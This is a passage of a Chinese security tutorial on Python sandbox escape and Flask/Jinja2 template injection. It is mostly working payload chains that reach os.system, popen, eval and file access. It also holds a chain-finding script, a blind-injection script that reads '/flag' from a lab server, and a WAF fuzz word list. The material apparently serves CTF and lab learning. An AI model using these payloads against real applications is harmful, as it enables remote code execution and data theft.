(77, 22, &lt;class <span class="hljs-string">&#x27;site.Quitter&#x27;</span>&gt;, <span class="hljs-string">&#x27;eval&#x27;</span>)
(77, 22, &lt;class <span class="hljs-string">&#x27;site.Quitter&#x27;</span>&gt;, <span class="hljs-string">&#x27;open&#x27;</span>)
(77, 22, &lt;class <span class="hljs-string">&#x27;site.Quitter&#x27;</span>&gt;, <span class="hljs-string">&#x27;execfile&#x27;</span>)
(78, 21, &lt;class <span class="hljs-string">&#x27;codecs.IncrementalEncoder&#x27;</span>&gt;, <span class="hljs-string">&#x27;open&#x27;</span>)
(78, 23, &lt;class <span class="hljs-string">&#x27;codecs.IncrementalEncoder&#x27;</span>&gt;, <span class="hljs-string">&#x27;__import__&#x27;</span>)
(78, 23, &lt;class <span class="hljs-string">&#x27;codecs.IncrementalEncoder&#x27;</span>&gt;, <span class="hljs-string">&#x27;file&#x27;</span>)
(78, 23, &lt;class <span class="hljs-string">&#x27;codecs.IncrementalEncoder&#x27;</span>&gt;, <span class="hljs-string">&#x27;compile&#x27;</span>)
(78, 23, &lt;class <span class="hljs-string">&#x27;codecs.IncrementalEncoder&#x27;</span>&gt;, <span class="hljs-string">&#x27;eval&#x27;</span>)
(78, 23, &lt;class <span class="hljs-string">&#x27;codecs.IncrementalEncoder&#x27;</span>&gt;, <span class="hljs-string">&#x27;open&#x27;</span>)
(78, 23, &lt;class <span class="hljs-string">&#x27;codecs.IncrementalEncoder&#x27;</span>&gt;, <span class="hljs-string">&#x27;execfile&#x27;</span>)
(79, 21, &lt;class <span class="hljs-string">&#x27;codecs.IncrementalDecoder&#x27;</span>&gt;, <span class="hljs-string">&#x27;open&#x27;</span>)
(79, 23, &lt;class <span class="hljs-string">&#x27;codecs.IncrementalDecoder&#x27;</span>&gt;, <span class="hljs-string">&#x27;__import__&#x27;</span>)
(79, 23, &lt;class <span class="hljs-string">&#x27;codecs.IncrementalDecoder&#x27;</span>&gt;, <span class="hljs-string">&#x27;file&#x27;</span>)
(79, 23, &lt;class <span class="hljs-string">&#x27;codecs.IncrementalDecoder&#x27;</span>&gt;, <span class="hljs-string">&#x27;compile&#x27;</span>)
(79, 23, &lt;class <span class="hljs-string">&#x27;codecs.IncrementalDecoder&#x27;</span>&gt;, <span class="hljs-string">&#x27;eval&#x27;</span>)
(79, 23, &lt;class <span class="hljs-string">&#x27;codecs.IncrementalDecoder&#x27;</span>&gt;, <span class="hljs-string">&#x27;open&#x27;</span>)
(79, 23, &lt;class <span class="hljs-string">&#x27;codecs.IncrementalDecoder&#x27;</span>&gt;, <span class="hljs-string">&#x27;execfile&#x27;</span>)
----------4-----------
(60, <span class="hljs-string">&#x27;__import__&#x27;</span>)
(60, <span class="hljs-string">&#x27;file&#x27;</span>)
(60, <span class="hljs-string">&#x27;repr&#x27;</span>)
(60, <span class="hljs-string">&#x27;compile&#x27;</span>)
(60, <span class="hljs-string">&#x27;eval&#x27;</span>)
(60, <span class="hljs-string">&#x27;open&#x27;</span>)
(60, <span class="hljs-string">&#x27;execfile&#x27;</span>)
</code></pre></div>



下面简单归纳下遍历的4种方式：

#### **第一种方式**

序号为40，即file()函数，进行文件读取和写入，payload如下：

<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">40</span>](<span class="hljs-string">&#x27;E:/passwd&#x27;</span>).read()
<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">40</span>](<span class="hljs-string">&#x27;E:/test.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>).write(<span class="hljs-string">&#x27;xxx&#x27;</span>)</code></pre></div>

这和前面元素链构造时给出的Demo有点区别：

<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;file&#x27;</span>](<span class="hljs-string">&#x27;E:/passwd&#x27;</span>).read()</code></pre></div>

序号59是WarningMessage类，其具有globals属性，包含builtins，其中含有file()函数，属于第二种方式；而这里是直接在object类的所有子类中直接找到了file()函数的序号为40，直接调用即可。

当然也可以通过调用index()函数的方式来寻找file()函数是否在object类的子类中且序号是多少：

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/7.png)

#### **第二种方式**

先看序号为59的WarningMessage类有哪些而利用的模块或方法：

<div class="hljs code-wrapper"><pre><code class="hljs python">(59, &lt;class &#x27;warnings.WarningMessage&#x27;&gt;, &#x27;linecache&#x27;, [&#x27;os&#x27;, &#x27;sys&#x27;, &#x27;__builtins__&#x27;])
(59, &lt;class &#x27;warnings.WarningMessage&#x27;&gt;, &#x27;__builtins__&#x27;, None)
(59, &lt;class &#x27;warnings.WarningMessage&#x27;&gt;, &#x27;sys&#x27;, None)
(59, &lt;class &#x27;warnings.WarningMessage&#x27;&gt;, &#x27;types&#x27;, [&#x27;__builtins__&#x27;])</code></pre></div>

以linecache中的os为例，这里简单解释下工具的寻找过程依次如下：

<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># 确认linecache</span>
<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;linecache&#x27;</span>]
<span class="hljs-comment"># 返回linecache字典中的所有键</span>
<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;linecache&#x27;</span>].__dict__
.keys()
<span class="hljs-comment"># 在linecache字典的所有键中寻找os的序号，找到为12</span>
<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;linecache&#x27;</span>].__dict__
.keys().index(<span class="hljs-string">&#x27;os&#x27;</span>)
<span class="hljs-comment"># 更换keys()为values()，访问12序号的元素，并获取该os字典的所有键</span>
<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;linecache&#x27;</span>].__dict__.values()[<span class="hljs-number">12</span>].__dict__.keys()
<span class="hljs-comment"># 在os字典的所有键中寻找system的序号，找到为79</span>
<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;linecache&#x27;</span>].__dict__.values()[<span class="hljs-number">12</span>].__dict__.keys().index(<span class="hljs-string">&#x27;system&#x27;</span>)
<span class="hljs-comment"># 执行os.system()</span>
<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;linecache&#x27;</span>].__dict__.values()[<span class="hljs-number">12</span>].__dict__.values()[<span class="hljs-number">79</span>](<span class="hljs-string">&#x27;calc&#x27;</span>)</code></pre></div>

payload如下：

<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># linecache利用</span>
<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;linecache&#x27;</span>].__dict__[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;calc&#x27;</span>)
<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;linecache&#x27;</span>].__dict__[<span class="hljs-string">&#x27;sys&#x27;</span>].modules[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;calc&#x27;</span>)
<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;linecache&#x27;</span>].__dict__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;calc&#x27;</span>)

<span class="hljs-comment"># __builtins__利用，包括__import__、file、open、execfile、eval、结合exec的compile等</span>
<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;calc&#x27;</span>)
<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;sys&#x27;</span>).modules[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;whoami&#x27;</span>).read()
<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;sys&#x27;</span>).modules[<span class="hljs-string">&#x27;platform&#x27;</span>].popen(<span class="hljs-string">&#x27;whoami&#x27;</span>).read()

<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;file&#x27;</span>](<span class="hljs-string">&#x27;E:/passwd&#x27;</span>).read()
<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;open&#x27;</span>](<span class="hljs-string">&#x27;E:/test.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>).write(<span class="hljs-string">&#x27;hello&#x27;</span>)
<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;execfile&#x27;</span>](<span class="hljs-string">&#x27;E:/exp.py&#x27;</span>)
<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&#x27;__import__(&quot;os&quot;).system(&quot;calc&quot;)&#x27;</span>)
exec(<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;compile&#x27;</span>](<span class="hljs-string">&#x27;__import__(&quot;os&quot;).system(&quot;calc&quot;)&#x27;</span>, <span class="hljs-string">&#x27;&lt;string&gt;&#x27;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>))

<span class="hljs-comment"># sys利用</span>
<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;sys&#x27;</span>].modules[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;calc&#x27;</span>)
<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;sys&#x27;</span>].modules[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;whoami&#x27;</span>).read()

<span class="hljs-comment"># types利用，后面还是通过__builtins__实现利用</span>
<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;types&#x27;</span>].__dict__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;calc&#x27;</span>)</code></pre></div>

序号为60的catch_warnings类利用payload同上。

序号为61、62的两个类均只有`__builtins__`可利用，利用payload同上。

序号为72、77的两个类_Printer和Quitter，相比前面的，没见过的有os和traceback，但只有os模块可利用：

<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># os利用</span>
<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">72</span>].__init__.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;calc&#x27;</span>)</code></pre></div>

序号为78、79的两个类IncrementalEncoder和IncrementalDecoder，相比前面的，没见过的有open：

<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># open利用</span>
<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">78</span>].__init__.__globals__[<span class="hljs-string">&#x27;open&#x27;</span>](<span class="hljs-string">&#x27;E:/passwd&#x27;</span>).read()
<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">78</span>].__init__.__globals__[<span class="hljs-string">&#x27;open&#x27;</span>](<span class="hljs-string">&#x27;E:/test.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>).write()</code></pre></div>

#### **第三种方式**

先看下序号为59的WarningMessage类：

<div class="hljs code-wrapper"><pre><code class="hljs python">(59, 13, &lt;class &#x27;warnings.WarningMessage&#x27;&gt;, &#x27;__import__&#x27;)
(59, 13, &lt;class &#x27;warnings.WarningMessage&#x27;&gt;, &#x27;file&#x27;)
(59, 13, &lt;class &#x27;warnings.WarningMessage&#x27;&gt;, &#x27;compile&#x27;)
(59, 13, &lt;class &#x27;warnings.WarningMessage&#x27;&gt;, &#x27;eval&#x27;)
(59, 13, &lt;class &#x27;warnings.WarningMessage&#x27;&gt;, &#x27;open&#x27;)
(59, 13, &lt;class &#x27;warnings.WarningMessage&#x27;&gt;, &#x27;execfile&#x27;)</code></pre></div>

注意是通过values()函数中的数组序号来填写第二个数值实现调用，以下以eval为示例，其他的利用payload和前面的差不多就不再赘述了：

<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__.values()[<span class="hljs-number">13</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&#x27;__import__(&quot;os&quot;).system(&quot;calc&quot;)&#x27;</span>)</code></pre></div>

其他类似修改即可。



#### **第四种方式**

这里只有一种序号，为60：

<div class="hljs code-wrapper"><pre><code class="hljs python">(<span class="hljs-number">60</span>, <span class="hljs-string">&#x27;__import__&#x27;</span>)
(<span class="hljs-number">60</span>, <span class="hljs-string">&#x27;file&#x27;</span>)
(<span class="hljs-number">60</span>, <span class="hljs-string">&#x27;repr&#x27;</span>)
(<span class="hljs-number">60</span>, <span class="hljs-string">&#x27;compile&#x27;</span>)
(<span class="hljs-number">60</span>, <span class="hljs-string">&#x27;eval&#x27;</span>)
(<span class="hljs-number">60</span>, <span class="hljs-string">&#x27;open&#x27;</span>)
(<span class="hljs-number">60</span>, <span class="hljs-string">&#x27;execfile&#x27;</span>)</code></pre></div>

调用示例如下，其他类似修改即可：

<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">60</span>]()._module.__builtins__[<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&quot;os&quot;</span>).system(<span class="hljs-string">&quot;calc&quot;</span>)</code></pre></div>

这个payload是在windows下运行的结果，这个模块为'warnings.catch_warnings'。linux下找到对应模块即可，序号不一定一致。





## **0x03 python3 flask 利用链**

flask_python3_find_payload.py

<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span>
<span class="hljs-comment"># coding=utf-8</span>
<span class="hljs-comment"># python 3.5</span>
<span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask
<span class="hljs-keyword">from</span> jinja2 <span class="hljs-keyword">import</span> Template
<span class="hljs-comment"># Some of special names</span>
searchList = [<span class="hljs-string">&#x27;__init__&#x27;</span>, <span class="hljs-string">&quot;__new__&quot;</span>, <span class="hljs-string">&#x27;__del__&#x27;</span>, <span class="hljs-string">&#x27;__repr__&#x27;</span>, <span class="hljs-string">&#x27;__str__&#x27;</span>, <span class="hljs-string">&#x27;__bytes__&#x27;</span>, <span class="hljs-string">&#x27;__format__&#x27;</span>, <span class="hljs-string">&#x27;__lt__&#x27;</span>, <span class="hljs-string">&#x27;__le__&#x27;</span>, <span class="hljs-string">&#x27;__eq__&#x27;</span>, <span class="hljs-string">&#x27;__ne__&#x27;</span>, <span class="hljs-string">&#x27;__gt__&#x27;</span>, <span class="hljs-string">&#x27;__ge__&#x27;</span>, <span class="hljs-string">&#x27;__hash__&#x27;</span>, <span class="hljs-string">&#x27;__bool__&#x27;</span>, <span class="hljs-string">&#x27;__getattr__&#x27;</span>, <span class="hljs-string">&#x27;__getattribute__&#x27;</span>, <span class="hljs-string">&#x27;__setattr__&#x27;</span>, <span class="hljs-string">&#x27;__dir__&#x27;</span>, <span class="hljs-string">&#x27;__delattr__&#x27;</span>, <span class="hljs-string">&#x27;__get__&#x27;</span>, <span class="hljs-string">&#x27;__set__&#x27;</span>, <span class="hljs-string">&#x27;__delete__&#x27;</span>, <span class="hljs-string">&#x27;__call__&#x27;</span>, <span class="hljs-string">&quot;__instancecheck__&quot;</span>, <span class="hljs-string">&#x27;__subclasscheck__&#x27;</span>, <span class="hljs-string">&#x27;__len__&#x27;</span>, <span class="hljs-string">&#x27;__length_hint__&#x27;</span>, <span class="hljs-string">&#x27;__missing__&#x27;</span>,<span class="hljs-string">&#x27;__getitem__&#x27;</span>, <span class="hljs-string">&#x27;__setitem__&#x27;</span>, <span class="hljs-string">&#x27;__iter__&#x27;</span>,<span class="hljs-string">&#x27;__delitem__&#x27;</span>, <span class="hljs-string">&#x27;__reversed__&#x27;</span>, <span class="hljs-string">&#x27;__contains__&#x27;</span>, <span class="hljs-string">&#x27;__add__&#x27;</span>, <span class="hljs-string">&#x27;__sub__&#x27;</span>,<span class="hljs-string">&#x27;__mul__&#x27;</span>]
neededFunction = [<span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>]
pay = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Payload?[1|0]&quot;</span>))
<span class="hljs-keyword">for</span> index, i <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(&#123;&#125;.__class__.__base__.__subclasses__()):
    <span class="hljs-keyword">for</span> attr <span class="hljs-keyword">in</span> searchList:
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(i, attr):
            <span class="hljs-keyword">if</span> <span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;str(i.&#x27;</span>+attr+<span class="hljs-string">&#x27;)[1:9]&#x27;</span>) == <span class="hljs-string">&#x27;function&#x27;</span>:
                <span class="hljs-keyword">for</span> goal <span class="hljs-keyword">in</span> neededFunction:
                    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;&quot;&#x27;</span>+goal+<span class="hljs-string">&#x27;&quot; in i.&#x27;</span>+attr+<span class="hljs-string">&#x27;.__globals__[&quot;__builtins__&quot;].keys()&#x27;</span>)):
                        <span class="hljs-keyword">if</span> pay != <span class="hljs-number">1</span>:
                            print(i.__name__,<span class="hljs-string">&quot;:&quot;</span>, attr, goal)
                        <span class="hljs-keyword">else</span>:
                            print(<span class="hljs-string">&quot;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;&quot;</span> + i.__name__ + <span class="hljs-string">&quot;&#x27; %&#125;&#123;&#123; c.&quot;</span> + attr + <span class="hljs-string">&quot;.__globals__[&#x27;__builtins__&#x27;].&quot;</span> + goal + <span class="hljs-string">&quot;(\&quot;[evil]\&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&quot;</span>)</code></pre></div>



例如：

<div class="hljs code-wrapper"><pre><code class="hljs jinja2">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;FileLoader&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;[evil]&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;
&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;FileLoader&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&quot;[evil]&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;
&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;FileLoader&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].exec(&quot;[evil]&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre></div>



吧[evil]换成对应的利用代码即可，例如：

<div class="hljs code-wrapper"><pre><code class="hljs jinja2">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;FileLoader&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre></div>



非常好用

![image-20201002114824676](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20201002114824676.png)





## 0x04 python代码编辑成一句话

推荐一个能把Python代码给编译成一句话的形式工具
官网 http://www.onelinerizer.com/
Github地址：https://github.com/csvoss/onelinerizer





## 0x05 盲注脚本

<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests

url = <span class="hljs-string">&#x27;http://192.168.133.180:5000/test?k=&#x27;</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check</span>(<span class="hljs-params">payload</span>):</span>
    postdata = &#123;
        <span class="hljs-string">&#x27;exploit&#x27;</span>:payload
        &#125;
    <span class="hljs-comment"># r = requests.post(url, data=postdata).content</span>
    <span class="hljs-comment"># print(payload)</span>
    r = requests.get(url+payload).text
    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;~p0~&#x27;</span> <span class="hljs-keyword">in</span> r
password  = <span class="hljs-string">&#x27;&#x27;</span>
s = <span class="hljs-string">r&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&quot;$\&#x27;()*+,-./:;&lt;=&gt;?@[\\]^`&#123;|&#125;~\&#x27;&quot;_%&#x27;</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">100</span>):
    print(i)
    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s:
        payload = <span class="hljs-string">&#x27;&#x27;&#x27;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;BlueprintSetupState&#x27; %&#125;&#123;% if c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()[&#x27;&#x27;&#x27;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&#x27;&#x27;&#x27;:&#x27;&#x27;&#x27;</span>+<span class="hljs-built_in">str</span>(i+<span class="hljs-number">1</span>)+<span class="hljs-string">&quot;] == &#x27;&quot;</span>+c+<span class="hljs-string">&#x27;&#x27;&#x27;&#x27;&quot;) %&#125;~p0~&#123;% endif %&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#x27;&#x27;&#x27;</span>
        <span class="hljs-keyword">if</span> check(payload):
            password += c
            print(c)
            <span class="hljs-keyword">break</span>
    print(password)</code></pre></div>





## 0x06 fuzz 脚本



waffuzz

<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span>
<span class="hljs-built_in">getattr</span>
os
<span class="hljs-class"><span class="hljs-keyword">class</span></span>
<span class="hljs-class"><span class="hljs-title">subclasses</span></span>
<span class="hljs-class"><span class="hljs-title">mro</span></span>
<span class="hljs-class"><span class="hljs-title">request</span></span>
<span class="hljs-class"><span class="hljs-title">args</span></span>
<span class="hljs-class"><span class="hljs-title">eval</span></span>
<span class="hljs-class"><span class="hljs-title">if</span></span>
<span class="hljs-class"><span class="hljs-title">for</span></span>
<span class="hljs-class"><span class="hljs-title">subprocess</span></span>
<span class="hljs-class"><span class="hljs-title">file</span></span>
<span class="hljs-class"><span class="hljs-title">open</span></span>
<span class="hljs-class"><span class="hljs-title">popen</span></span>
<span class="hljs-class"><span class="hljs-title">builtins</span></span>
<span class="hljs-class"><span class="hljs-title">compile</span></span>
<span class="hljs-class"><span class="hljs-title">execfile</span></span>
<span class="hljs-class"><span class="hljs-title">from_pyfile</span></span>
<span class="hljs-class"><span class="hljs-title">config</span></span>
<span class="hljs-class"><span class="hljs-title">local</span></span>
<span class="hljs-class"><span class="hljs-title">self</span></span>
<span class="hljs-class"><span class="hljs-title">item</span></span>
<span class="hljs-class"><span class="hljs-title">getitem</span></span>
<span class="hljs-class"><span class="hljs-title">getattribute</span></span>
<span class="hljs-class"><span class="hljs-title">func_globals</span></span>
<span class="hljs-class"><span class="hljs-title">__init__</span></span>
<span class="hljs-class"><span class="hljs-title">join</span></span>
<span class="hljs-class"><span class="hljs-title">__dict__</span></span>
<span class="hljs-class">[</span>
<span class="hljs-class">]</span>
<span class="hljs-class"><span class="hljs-title">ls</span></span>
<span class="hljs-class"><span class="hljs-title">_module</span></span>
<span class="hljs-class"><span class="hljs-title">__globals__</span></span>
<span class="hljs-class"><span class="hljs-title">__getattribute__</span></span>
<span class="hljs-class"><span class="hljs-title">__base__</span></span>
<span class="hljs-class"><span class="hljs-title">system</span></span>
<span class="hljs-class"><span class="hljs-title">popen</span></span>
<span class="hljs-class"><span class="hljs-title">exec</span></span>
<span class="hljs-class"><span class="hljs-title">read</span></span>
<span class="hljs-class"><span class="hljs-title">write</span></span>
<span class="hljs-class"><span class="hljs-title">timeit</span></span>
<span class="hljs-class"><span class="hljs-title">platform</span></span>
<span class="hljs-class"><span class="hljs-title">builtins</span></span>
<span class="hljs-class"><span class="hljs-title">compile</span></span>
<span class="hljs-class"><span class="hljs-title">session</span></span>
<span class="hljs-class"><span class="hljs-title">url_for</span></span>
<span class="hljs-class"><span class="hljs-title">application</span></span>
<span class="hljs-class"><span class="hljs-title">get_flashed_messages</span></span>
<span class="hljs-class"><span class="hljs-title">g</span></span>
<span class="hljs-class"><span class="hljs-title">__class__</span></span>
<span class="hljs-class"><span class="hljs-title">__mro__</span></span>
<span class="hljs-class">&#x27;&#x27;</span>
<span class="hljs-class">&quot;&quot;</span>
<span class="hljs-class">.</span>
<span class="hljs-class">()</span>
&#123;&#125;
linecache
__builtins__
__subclasses__
|
<span class="hljs-built_in">format</span>
|<span class="hljs-built_in">format</span>
__
request[request
args
value

</code></pre></div>





# 例题



## 简单测试

<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask
<span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> render_template
<span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request
<span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> render_template_string

app = Flask(__name__)
<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/test&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span>():</span>
    template = <span class="hljs-string">&#x27;&#x27;&#x27;</span>
<span class="hljs-string">        &lt;div class=&quot;center-content error&quot;&gt;</span>
<span class="hljs-string">            &lt;h1&gt;Oops! That page doesn&#x27;t exist.&lt;/h1&gt;</span>
